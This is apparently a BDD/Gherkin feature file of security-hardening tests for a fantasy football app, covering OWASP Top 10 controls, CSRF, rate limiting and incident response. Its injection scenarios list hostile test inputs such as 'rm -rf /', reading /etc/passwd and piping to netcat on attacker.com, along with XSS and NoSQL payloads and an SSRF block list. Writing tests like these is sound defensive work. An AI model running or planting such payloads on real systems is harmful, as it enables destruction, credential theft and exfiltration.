@security @owasp @hardening @compliance
Feature: FFL-56: Security Hardening and OWASP Compliance
  As a security engineer
  I want comprehensive security controls implemented in the FFL Playoffs application
  So that the application is protected against common attacks and meets OWASP Top 10 compliance

  Background:
    Given the FFL Playoffs application is deployed
    And security controls are enabled
    And security monitoring is active

  # ==========================================
  # OWASP A01:2021 - BROKEN ACCESS CONTROL
  # ==========================================

  @owasp @A01 @access-control
  Scenario: Enforce principle of least privilege
    Given a user with "player" role is authenticated
    When the user attempts to access admin endpoints
    Then the request should be denied with 403 Forbidden
    And the access violation should be logged
    And no admin functionality should be exposed

  @owasp @A01 @access-control
  Scenario: Prevent insecure direct object references (IDOR)
    Given user "player1" owns roster with ID "roster-123"
    And user "player2" is authenticated
    When "player2" attempts to access "/api/rosters/roster-123"
    Then the request should be denied with 403 Forbidden
    And the response should not reveal that the resource exists

  @owasp @A01 @access-control
  Scenario: Validate ownership on all resource operations
    Given user "player1" is authenticated
    When the user attempts operations on resources they don't own:
      | operation | resource              | expected_result |
      | GET       | /api/rosters/other-id | 403 Forbidden   |
      | PUT       | /api/rosters/other-id | 403 Forbidden   |
      | DELETE    | /api/rosters/other-id | 403 Forbidden   |
      | PATCH     | /api/rosters/other-id | 403 Forbidden   |
    Then all unauthorized operations should be blocked

  @owasp @A01 @access-control
  Scenario: Deny access by default
    Given a new API endpoint is created
    When no explicit access rules are defined
    Then the endpoint should deny all access by default
    And authentication should be required
    And authorization should be enforced

  @owasp @A01 @access-control
  Scenario: Prevent privilege escalation
    Given a user with "player" role is authenticated
    When the user attempts to modify their own role to "admin"
    Then the request should be rejected
    And the user's role should remain "player"
    And a security alert should be raised

  @owasp @A01 @cors
  Scenario: CORS is properly configured
    Given CORS is enabled for the API
    When a request is made from an unauthorized origin
    Then the request should be blocked
    And proper CORS headers should be set:
      | header                        | value                          |
      | Access-Control-Allow-Origin   | https://fflplayoffs.com        |
      | Access-Control-Allow-Methods  | GET, POST, PUT, DELETE         |
      | Access-Control-Allow-Headers  | Authorization, Content-Type    |
      | Access-Control-Max-Age        | 86400                          |

  # ==========================================
  # OWASP A02:2021 - CRYPTOGRAPHIC FAILURES
  # ==========================================

  @owasp @A02 @encryption
  Scenario: All data in transit is encrypted
    Given the application is running
    When any HTTP request is made
    Then TLS 1.2 or higher should be enforced
    And HTTP requests should redirect to HTTPS
    And HSTS header should be present

  @owasp @A02 @encryption
  Scenario: Sensitive data at rest is encrypted
    Given sensitive data is stored in the database
    Then the following fields should be encrypted:
      | entity    | field              | encryption_method    |
      | User      | email              | AES-256-GCM          |
      | User      | personalAccessToken| Argon2id hash        |
      | Session   | token              | AES-256-GCM          |
    And encryption keys should be managed via KMS

  @owasp @A02 @passwords
  Scenario: Passwords are securely hashed
    Given a user sets a password
    When the password is stored
    Then it should be hashed using Argon2id
    And the hash should include:
      | parameter      | value          |
      | memory         | 65536 KB       |
      | iterations     | 3              |
      | parallelism    | 4              |
      | salt_length    | 16 bytes       |
    And the plaintext password should never be stored

  @owasp @A02 @secrets
  Scenario: Secrets are not exposed in logs or responses
    Given the application processes sensitive data
    When logs are generated
    Then the following should never appear in logs:
      | secret_type        |
      | passwords          |
      | API keys           |
      | tokens             |
      | credit card numbers|
      | SSN                |
    And error responses should not reveal sensitive data

  @owasp @A02 @key-management
  Scenario: Encryption keys are properly managed
    Given the application uses encryption
    Then encryption keys should:
      | requirement                           |
      | Be stored in environment variables    |
      | Never be committed to source control  |
      | Be rotated every 90 days              |
      | Have separate keys per environment    |
      | Use key derivation for app-level keys |

  # ==========================================
  # OWASP A03:2021 - INJECTION
  # ==========================================

  @owasp @A03 @injection @nosql
  Scenario: Prevent NoSQL injection in MongoDB queries
    Given the application uses MongoDB
    When a user submits input containing NoSQL operators:
      | malicious_input                        |
      | {"$gt": ""}                            |
      | {"$ne": null}                          |
      | {"$where": "this.password.length > 0"} |
    Then the query should be sanitized
    And the injection attempt should be blocked
    And the attack should be logged

  @owasp @A03 @injection @command
  Scenario: Prevent OS command injection
    Given the application processes user input
    When input contains shell metacharacters:
      | malicious_input                |
      | ; rm -rf /                     |
      | `cat /etc/passwd`              |
      | $(whoami)                      |
      | | nc attacker.com 1234         |
    Then the input should be rejected
    And no shell commands should be executed
    And the attack should be logged

  @owasp @A03 @injection @ldap
  Scenario: Prevent LDAP injection
    Given LDAP authentication is used
    When a user submits LDAP special characters:
      | malicious_input     |
      | *)(uid=*))(|(uid=*  |
      | admin)(|(password=*)|
    Then the input should be sanitized
    And LDAP queries should use parameterized filters

  @owasp @A03 @xss
  Scenario: Prevent Cross-Site Scripting (XSS)
    Given the application renders user-provided content
    When input contains XSS payloads:
      | malicious_input                           |
      | <script>alert('XSS')</script>             |
      | <img src=x onerror=alert('XSS')>          |
      | javascript:alert('XSS')                   |
      | <svg onload=alert('XSS')>                 |
    Then the output should be properly encoded
    And script tags should not execute
    And Content-Security-Policy header should be set

  @owasp @A03 @validation
  Scenario: Input validation is applied to all user inputs
    Given user input is received
    Then validation should be applied:
      | field           | validation_rules                       |
      | email           | RFC 5322 format, max 254 chars         |
      | username        | Alphanumeric, 3-50 chars               |
      | league_name     | Printable chars, 1-100 chars           |
      | roster_id       | UUID format                            |
      | week_number     | Integer 1-18                           |
    And invalid input should be rejected with 400 Bad Request

  # ==========================================
  # OWASP A04:2021 - INSECURE DESIGN
  # ==========================================

  @owasp @A04 @design
  Scenario: Rate limiting prevents abuse
    Given the API has rate limiting enabled
    When a client exceeds the rate limit:
      | endpoint_type    | limit        | window   |
      | Authentication   | 5 requests   | 1 minute |
      | API (general)    | 100 requests | 1 minute |
      | Expensive ops    | 10 requests  | 1 minute |
    Then subsequent requests should receive 429 Too Many Requests
    And the Retry-After header should be set

  @owasp @A04 @design
  Scenario: Business logic is protected
    Given a user is building their roster
    When the user attempts to:
      | action                                  | expected_result        |
      | Add same player twice                   | Rejected               |
      | Add player from another league          | Rejected               |
      | Submit roster after lock deadline       | Rejected               |
      | Exceed roster size limit                | Rejected               |
    Then business rule violations should be prevented

  @owasp @A04 @design
  Scenario: Fail securely on errors
    Given an unexpected error occurs
    When the error is handled
    Then the response should not reveal:
      | sensitive_info          |
      | Stack traces            |
      | Database queries        |
      | Internal paths          |
      | Framework versions      |
    And a generic error message should be returned
    And details should be logged server-side

  # ==========================================
  # OWASP A05:2021 - SECURITY MISCONFIGURATION
  # ==========================================

  @owasp @A05 @headers
  Scenario: Security headers are properly configured
    Given a request is made to the application
    When the response is returned
    Then the following security headers should be present:
      | header                          | value                                |
      | Strict-Transport-Security       | max-age=31536000; includeSubDomains  |
      | X-Content-Type-Options          | nosniff                              |
      | X-Frame-Options                 | DENY                                 |
      | X-XSS-Protection                | 1; mode=block                        |
      | Content-Security-Policy         | default-src 'self'; ...              |
      | Referrer-Policy                 | strict-origin-when-cross-origin      |
      | Permissions-Policy              | geolocation=(), microphone=()        |

  @owasp @A05 @configuration
  Scenario: Default credentials are not used
    Given the application and its dependencies are deployed
    Then no default credentials should exist:
      | component        | check                              |
      | MongoDB          | No default admin/admin             |
      | Redis            | Authentication required            |
      | Application      | No hardcoded credentials           |
      | API keys         | Unique per environment             |

  @owasp @A05 @configuration
  Scenario: Debug features are disabled in production
    Given the application is deployed to production
    Then the following should be disabled:
      | feature                  |
      | Debug mode               |
      | Stack trace in responses |
      | Verbose error messages   |
      | Development endpoints    |
      | GraphQL introspection    |

  @owasp @A05 @configuration
  Scenario: Unnecessary features are disabled
    Given the application is deployed
    Then the following should be disabled or removed:
      | feature                    | reason                        |
      | Unused HTTP methods        | Reduce attack surface         |
      | Directory listing          | Prevent information disclosure|
      | Server version headers     | Hide implementation details   |
      | TRACE/TRACK methods        | Prevent XST attacks           |

  @owasp @A05 @configuration
  Scenario: Error pages do not reveal information
    Given an error occurs in the application
    When error pages are displayed
    Then they should not reveal:
      | information              |
      | Technology stack         |
      | Framework version        |
      | Server paths             |
      | Database information     |
    And custom error pages should be used

  # ==========================================
  # OWASP A06:2021 - VULNERABLE COMPONENTS
  # ==========================================

  @owasp @A06 @dependencies
  Scenario: Dependencies are scanned for vulnerabilities
    Given the application has third-party dependencies
    When dependency scanning is performed
    Then the scan should check:
      | source               | tool                    |
      | Maven dependencies   | OWASP Dependency-Check  |
      | NPM packages         | npm audit               |
      | Docker images        | Trivy                   |
    And vulnerabilities should be reported by severity

  @owasp @A06 @dependencies
  Scenario: Critical vulnerabilities block deployment
    Given a dependency has a critical CVE
    When the CI/CD pipeline runs
    Then the build should fail
    And the vulnerability details should be reported:
      | field              | example                          |
      | CVE ID             | CVE-2024-12345                   |
      | Severity           | CRITICAL                         |
      | Affected package   | log4j-core                       |
      | Fixed version      | 2.17.1                           |

  @owasp @A06 @dependencies
  Scenario: Dependencies are kept up to date
    Given the application has dependencies
    Then dependency updates should be checked weekly
    And dependencies should be updated within:
      | severity   | max_days |
      | Critical   | 1        |
      | High       | 7        |
      | Medium     | 30       |
      | Low        | 90       |

  @owasp @A06 @sbom
  Scenario: Software Bill of Materials is maintained
    Given the application is built
    Then an SBOM should be generated including:
      | component            | details                         |
      | Direct dependencies  | Name, version, license          |
      | Transitive deps      | Name, version, license          |
      | Container base image | Name, version, vulnerabilities  |
    And the SBOM should be in CycloneDX format

  # ==========================================
  # OWASP A07:2021 - AUTHENTICATION FAILURES
  # ==========================================

  @owasp @A07 @authentication
  Scenario: Brute force protection on login
    Given a user is attempting to log in
    When 5 failed login attempts occur for the same account
    Then the account should be temporarily locked
    And the lockout duration should increase exponentially:
      | attempt | lockout_duration |
      | 5       | 1 minute         |
      | 10      | 5 minutes        |
      | 15      | 15 minutes       |
      | 20      | 1 hour           |
    And the user should be notified via email

  @owasp @A07 @authentication
  Scenario: Secure session management
    Given a user is authenticated
    Then session tokens should:
      | requirement                              |
      | Be generated using CSPRNG                |
      | Be at least 128 bits of entropy          |
      | Be transmitted only over HTTPS           |
      | Have secure and httpOnly cookie flags    |
      | Expire after 24 hours of inactivity      |
      | Be regenerated after privilege changes   |

  @owasp @A07 @authentication
  Scenario: Password policy is enforced
    Given a user is setting a password
    Then the password must meet these requirements:
      | requirement            | value                          |
      | Minimum length         | 12 characters                  |
      | Maximum length         | 128 characters                 |
      | Character requirements | No specific character classes  |
      | Breach check           | HIBP API integration           |
      | Common password check  | Top 10000 passwords blocked    |

  @owasp @A07 @authentication
  Scenario: Multi-factor authentication support
    Given MFA is enabled for a user
    When the user logs in with valid credentials
    Then they should be prompted for second factor
    And supported second factors should include:
      | method              |
      | TOTP (Authenticator)|
      | SMS (backup only)   |
      | Recovery codes      |

  @owasp @A07 @authentication
  Scenario: Secure credential recovery
    Given a user requests password reset
    Then the reset process should:
      | step                                              |
      | Not reveal if email exists                        |
      | Send reset link with single-use token             |
      | Expire reset token after 15 minutes               |
      | Invalidate token after successful reset           |
      | Notify user of password change via email          |

  # ==========================================
  # OWASP A08:2021 - SOFTWARE AND DATA INTEGRITY
  # ==========================================

  @owasp @A08 @integrity
  Scenario: CI/CD pipeline integrity is verified
    Given code is deployed through CI/CD
    Then the pipeline should:
      | verification                               |
      | Require signed commits                     |
      | Verify artifact checksums                  |
      | Use pinned dependency versions             |
      | Run in isolated environments               |
      | Require approval for production deploys    |

  @owasp @A08 @integrity
  Scenario: API responses are validated
    Given the application consumes external APIs
    When responses are received
    Then the application should:
      | validation                                 |
      | Verify response schema                     |
      | Check for expected content types           |
      | Validate digital signatures if present     |
      | Reject unexpected fields                   |

  @owasp @A08 @deserialization
  Scenario: Prevent insecure deserialization
    Given the application deserializes user input
    Then the following protections should be in place:
      | protection                                 |
      | Use safe deserialization methods           |
      | Validate input before deserialization      |
      | Restrict classes that can be deserialized  |
      | Monitor deserialization operations         |

  # ==========================================
  # OWASP A09:2021 - SECURITY LOGGING AND MONITORING
  # ==========================================

  @owasp @A09 @logging
  Scenario: Security events are logged
    Given security-relevant events occur
    Then the following events should be logged:
      | event_type                    | log_level |
      | Successful login              | INFO      |
      | Failed login attempt          | WARN      |
      | Password change               | INFO      |
      | Privilege escalation attempt  | ERROR     |
      | Access denied                 | WARN      |
      | Input validation failure      | WARN      |
      | Rate limit exceeded           | WARN      |

  @owasp @A09 @logging
  Scenario: Logs contain sufficient context
    Given a security event is logged
    Then the log entry should include:
      | field            | description                      |
      | timestamp        | ISO 8601 format with timezone    |
      | event_type       | Type of security event           |
      | user_id          | Authenticated user (if any)      |
      | ip_address       | Client IP (anonymized if needed) |
      | user_agent       | Client user agent                |
      | request_id       | Unique request identifier        |
      | outcome          | Success or failure               |

  @owasp @A09 @monitoring
  Scenario: Security alerts are triggered
    Given security monitoring is active
    When the following patterns are detected:
      | pattern                              | threshold       |
      | Multiple failed logins               | 10 in 5 minutes |
      | Access denied spikes                 | 50 in 1 minute  |
      | SQL/NoSQL injection attempts         | 5 in 1 minute   |
      | XSS attempts                         | 10 in 5 minutes |
    Then security alerts should be triggered
    And the security team should be notified

  @owasp @A09 @logging
  Scenario: Logs are protected from tampering
    Given logs are being collected
    Then log integrity should be ensured by:
      | protection                           |
      | Centralized log aggregation          |
      | Append-only log storage              |
      | Access controls on log files         |
      | Log integrity monitoring             |
      | Retention per compliance requirements|

  # ==========================================
  # OWASP A10:2021 - SERVER-SIDE REQUEST FORGERY
  # ==========================================

  @owasp @A10 @ssrf
  Scenario: SSRF attacks are prevented
    Given the application makes server-side requests
    When a user provides a URL parameter
    Then the following should be blocked:
      | url_pattern                           | reason               |
      | http://localhost/*                    | Internal access      |
      | http://127.0.0.1/*                    | Loopback             |
      | http://169.254.169.254/*              | Cloud metadata       |
      | http://10.0.0.0/8                     | Private network      |
      | http://192.168.0.0/16                 | Private network      |
      | file:///etc/passwd                    | File access          |

  @owasp @A10 @ssrf
  Scenario: URL allowlisting for external requests
    Given the application fetches external resources
    Then only allowlisted domains should be accessible:
      | allowed_domain         | purpose                |
      | api.espn.com           | NFL data               |
      | api.nfl.com            | NFL data               |
      | cdn.fflplayoffs.com    | Static assets          |
    And requests to other domains should be blocked

  # ==========================================
  # CSRF PROTECTION
  # ==========================================

  @csrf @protection
  Scenario: CSRF tokens are required for state-changing operations
    Given a user is authenticated
    When a POST/PUT/DELETE request is made
    Then a valid CSRF token must be present
    And the token should be validated server-side
    And requests without valid tokens should be rejected with 403

  @csrf @protection
  Scenario: CSRF tokens are properly generated
    Given a user session is created
    Then the CSRF token should:
      | requirement                              |
      | Be unique per session                    |
      | Be cryptographically random              |
      | Be tied to the user's session            |
      | Expire with the session                  |

  @csrf @protection
  Scenario: Double-submit cookie pattern is implemented
    Given CSRF protection is enabled
    When a request is made
    Then the CSRF token should be:
      | location      | validation                     |
      | Cookie        | Secure, SameSite=Strict        |
      | Header/Body   | Matches cookie value           |

  @csrf @protection @samesite
  Scenario: SameSite cookie attribute is set
    Given cookies are set by the application
    Then session cookies should have:
      | attribute    | value     |
      | SameSite     | Strict    |
      | Secure       | true      |
      | HttpOnly     | true      |

  # ==========================================
  # RATE LIMITING
  # ==========================================

  @rate-limiting @configuration
  Scenario: Rate limiting is configured per endpoint type
    Given rate limiting is enabled
    Then limits should be set per endpoint category:
      | endpoint_category  | requests | window    | by           |
      | Login              | 5        | 1 minute  | IP + account |
      | Password reset     | 3        | 15 minutes| IP + email   |
      | API read           | 1000     | 1 minute  | API key      |
      | API write          | 100      | 1 minute  | API key      |
      | File upload        | 10       | 1 hour    | User         |

  @rate-limiting @response
  Scenario: Rate limit response includes retry information
    Given a client exceeds their rate limit
    When the rate limit response is returned
    Then the response should include:
      | header               | value                         |
      | Retry-After          | Seconds until limit resets    |
      | X-RateLimit-Limit    | Maximum requests allowed      |
      | X-RateLimit-Remaining| Requests remaining            |
      | X-RateLimit-Reset    | Time when limit resets        |

  @rate-limiting @distributed
  Scenario: Rate limiting works in distributed environment
    Given the application runs on multiple instances
    When rate limits are enforced
    Then limits should be shared across instances
    And Redis should be used for rate limit storage
    And atomic operations should prevent race conditions

  @rate-limiting @bypass
  Scenario: Rate limiting cannot be bypassed
    Given rate limiting is enforced
    When an attacker attempts bypass techniques:
      | technique                    | result           |
      | IP spoofing via headers      | Blocked          |
      | X-Forwarded-For manipulation | Blocked          |
      | Distributed IPs              | Still rate limited|
      | Case variation in paths      | Normalized       |
    Then all bypass attempts should fail

  # ==========================================
  # INPUT VALIDATION
  # ==========================================

  @input-validation @sanitization
  Scenario: Input is sanitized before processing
    Given user input is received
    When the input is processed
    Then the following sanitization should occur:
      | input_type     | sanitization                      |
      | HTML content   | Strip dangerous tags and attrs    |
      | JSON           | Parse and re-serialize            |
      | File names     | Remove path traversal characters  |
      | Query params   | URL decode and validate           |

  @input-validation @length
  Scenario: Input length limits are enforced
    Given user input is received
    Then the following length limits should be enforced:
      | field              | max_length |
      | Email              | 254        |
      | Username           | 50         |
      | Password           | 128        |
      | League name        | 100        |
      | Team name          | 50         |
      | Message/comment    | 1000       |
    And inputs exceeding limits should be rejected

  @input-validation @content-type
  Scenario: Content-Type validation is enforced
    Given a request is received
    When the Content-Type header is checked
    Then only expected content types should be accepted:
      | endpoint_type    | allowed_content_types           |
      | API endpoints    | application/json                |
      | File uploads     | multipart/form-data             |
      | Form submissions | application/x-www-form-urlencoded|
    And mismatched content types should be rejected

  @input-validation @file-upload
  Scenario: File uploads are securely handled
    Given a user uploads a file
    Then the following validations should occur:
      | validation                | action                        |
      | File extension            | Allowlist only                |
      | MIME type                 | Verify matches extension      |
      | File size                 | Max 10MB                      |
      | File content              | Scan for malware              |
      | Filename                  | Sanitize, generate new name   |
    And files should be stored outside web root

  # ==========================================
  # DEPENDENCY SCANNING
  # ==========================================

  @dependency-scanning @ci
  Scenario: Dependency scanning runs in CI pipeline
    Given the CI pipeline is configured
    When a build is triggered
    Then dependency scanning should run:
      | scan_type            | tool                        |
      | Java dependencies    | OWASP Dependency-Check      |
      | NPM dependencies     | npm audit                   |
      | Container images     | Trivy                       |
      | Static analysis      | SonarQube                   |

  @dependency-scanning @reporting
  Scenario: Vulnerability reports are generated
    Given dependency scanning completes
    Then a report should be generated including:
      | field                | description                    |
      | Total vulnerabilities| Count by severity              |
      | CVE details          | ID, description, CVSS score    |
      | Affected packages    | Name, version, path            |
      | Remediation          | Fixed version, workarounds     |
      | First detected       | When vulnerability was found   |

  @dependency-scanning @policy
  Scenario: Vulnerability thresholds are enforced
    Given dependency scanning is configured
    Then the following thresholds should block builds:
      | environment   | critical | high | medium |
      | Production    | 0        | 0    | 5      |
      | Staging       | 0        | 5    | 10     |
      | Development   | 5        | 10   | 20     |

  # ==========================================
  # SECURITY TESTING
  # ==========================================

  @security-testing @sast
  Scenario: Static Application Security Testing is performed
    Given code is committed
    When SAST analysis runs
    Then the following should be checked:
      | vulnerability_type        |
      | SQL/NoSQL injection       |
      | XSS vulnerabilities       |
      | Hardcoded credentials     |
      | Insecure cryptography     |
      | Path traversal            |
      | Sensitive data exposure   |

  @security-testing @dast
  Scenario: Dynamic Application Security Testing is performed
    Given the application is deployed to staging
    When DAST scan runs
    Then the following should be tested:
      | test_category            |
      | Authentication bypass    |
      | Session management       |
      | Injection vulnerabilities|
      | Information disclosure   |
      | Security misconfigurations|

  @security-testing @penetration
  Scenario: Regular penetration testing is performed
    Given the application is in production
    Then penetration testing should occur:
      | frequency    | scope                           |
      | Quarterly    | Full application                |
      | After major  | Changed components              |
      | Annually     | Third-party assessment          |
    And findings should be tracked to resolution

  # ==========================================
  # SECURITY RESPONSE
  # ==========================================

  @security-response @incident
  Scenario: Security incident response process exists
    Given a security incident is detected
    Then the response process should include:
      | step                    | max_time        |
      | Detection and triage    | 15 minutes      |
      | Initial containment     | 1 hour          |
      | Investigation           | 24 hours        |
      | Eradication             | 48 hours        |
      | Recovery                | 72 hours        |
      | Post-incident review    | 1 week          |

  @security-response @disclosure
  Scenario: Responsible disclosure program exists
    Given a security researcher finds a vulnerability
    Then there should be:
      | element                 | details                       |
      | Security policy         | security.txt at well-known URI|
      | Contact method          | security@fflplayoffs.com      |
      | Response time           | Acknowledge within 48 hours   |
      | Safe harbor             | No legal action for good faith|
      | Recognition             | Hall of fame, bounties        |

  # ==========================================
  # COMPLIANCE VERIFICATION
  # ==========================================

  @compliance @verification
  Scenario: OWASP Top 10 compliance is verified
    Given security controls are implemented
    When compliance is verified
    Then all OWASP Top 10 categories should be addressed:
      | category | controls_implemented              |
      | A01      | Access control, RBAC, CORS        |
      | A02      | TLS, encryption, key management   |
      | A03      | Input validation, output encoding |
      | A04      | Rate limiting, business logic     |
      | A05      | Security headers, configuration   |
      | A06      | Dependency scanning, SBOM         |
      | A07      | MFA, session management, policy   |
      | A08      | CI/CD integrity, signatures       |
      | A09      | Logging, monitoring, alerting     |
      | A10      | SSRF prevention, URL validation   |

  @compliance @audit
  Scenario: Security audit trail is maintained
    Given security-relevant operations occur
    Then an audit trail should record:
      | operation                | recorded_data                   |
      | Authentication           | User, time, result, IP          |
      | Authorization changes    | User, role, changed by, time    |
      | Data access              | User, resource, action, time    |
      | Configuration changes    | Setting, old/new value, user    |
    And audit logs should be immutable
    And retention should be minimum 1 year
